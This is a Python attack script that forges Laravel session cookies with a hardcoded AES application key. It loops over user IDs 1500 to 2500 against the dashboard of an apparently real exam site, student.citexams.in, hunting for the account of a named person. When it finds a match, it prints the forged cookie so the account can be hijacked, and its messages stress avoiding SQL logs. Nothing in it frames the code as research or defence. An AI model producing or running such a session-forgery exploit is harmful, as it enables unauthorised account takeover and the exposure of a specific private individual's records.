import base64, json, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY = base64.b64decode("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")

def forge_cookie(uid):
    payload = {
        "id": uid,
        "login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d": uid
    }
    iv = AES.get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(json.dumps(payload).encode(), AES.block_size))
    final = base64.b64encode(
        json.dumps({"iv": base64.b64encode(iv).decode(), "value": base64.b64encode(enc).decode()}).encode()
    ).decode()
    return final

print("[*] Scanning ID range 1500 to 2500 for AFNAN TARIQ (HTTP-only, no SQL logs)...")
for uid in range(1500, 2501):
    cookie = forge_cookie(uid)
    try:
        resp = requests.get(
            "https://student.citexams.in/dashboard",
            cookies={"laravel_session": cookie},
            verify=False,
            timeout=3,
            allow_redirects=False
        )
        # Check for the name in the response
        if resp.status_code == 200 and "AFNAN TARIQ" in resp.text:
            print(f"\n✅ FOUND AFNAN TARIQ at ID: {uid}")
            print(f"   Cookie: {cookie}")
            break
        if uid % 100 == 0:
            print(f"   ...checked up to {uid}")
    except Exception as e:
        print(f"   [!] Error at {uid}: {e}")

print("[*] Scan complete.")